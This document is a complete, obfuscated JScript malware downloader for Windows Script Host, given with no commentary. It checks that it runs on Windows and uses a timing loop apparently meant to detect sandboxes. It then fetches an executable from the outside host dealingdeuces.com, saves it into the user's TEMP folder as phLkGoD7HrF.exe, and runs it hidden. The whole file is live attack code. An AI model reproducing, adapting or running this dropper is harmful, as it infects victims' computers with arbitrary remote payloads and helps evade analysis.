var N = false;
var K = "CreateObject";
var Q0 = function og() {return WScript[K]("WScript.Shell");}(), Eu = 11;
var w = "MSXML2.XMLHTTP";
var q0 = 2123213;
var Z = 0;
function dC(DV){Q0["Run"](DV, Z, Z);};
function D(){return "" + w;};
function FN(L, xB){Z = Z * 1; return L - xB;};
function C(){return K;};
/*@cc_on
  @if (@_win32 || @_win64)
    N = true;
  @end
@*/
if (N)
{
var lV = "";
function Vr(){return 22;};
var eT = 0; var zW = 0;
function rb()
{
var Gm = new this["Date"]();
var q = Gm["getUTCMilliseconds"]();
WScript["Sleep"](Vr());
var Gm = new this["Date"]();
var Pb = Gm["getUTCMilliseconds"]();
WScript["Sleep"](Vr());
var Gm = new this["Date"]();
var G = Gm["getUTCMilliseconds"]();
var eT = "X";
eT = FN(Pb, q);
var zW = "BC";
zW = FN(G, Pb);
lV = "open";
return FN(eT, zW);
}
var j = false;
var lo = false;
for (var Fe = Z; Fe < Vr() * 1; Fe++){if (rb() != Z){
j = true; 
zW = "31" + 11 * eT + zW; 
lo = true; 
break;
}}
function Y() {return ((j == true) && (j == lo)) ? 1 : Z;};
if (j && Y() && lo){
function T() {return Q0["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "phLkGoD7HrF.exe";};
 o = D();
 pt = WScript[K](o);
 var a = 1;
 while (a){
try {
pt[lV]("GET", "http://dealingdeuces.com/o4pskd", false);
pt["send"]();
e = "Sleep";
for (;;){WScript[e](Vr() * 11); if (pt["readystate"] >= 2 * 2) break;};
a = Z;
} catch(Fo){};
}
function g(un) {var Cg = (1, 2, 3, 4, 5, un); return Cg;};
f = WScript[C()]("ADODB.Stream");
o = f;
o[lV]();
o["type"] = g(1);
o["write"](pt["ResponseBody"]);
f["position"] = g(Z);
o["Save" + "ToFile"](T(), 2);
f["c"+"lose"]();
Q = T();
dC(Q);
}
}

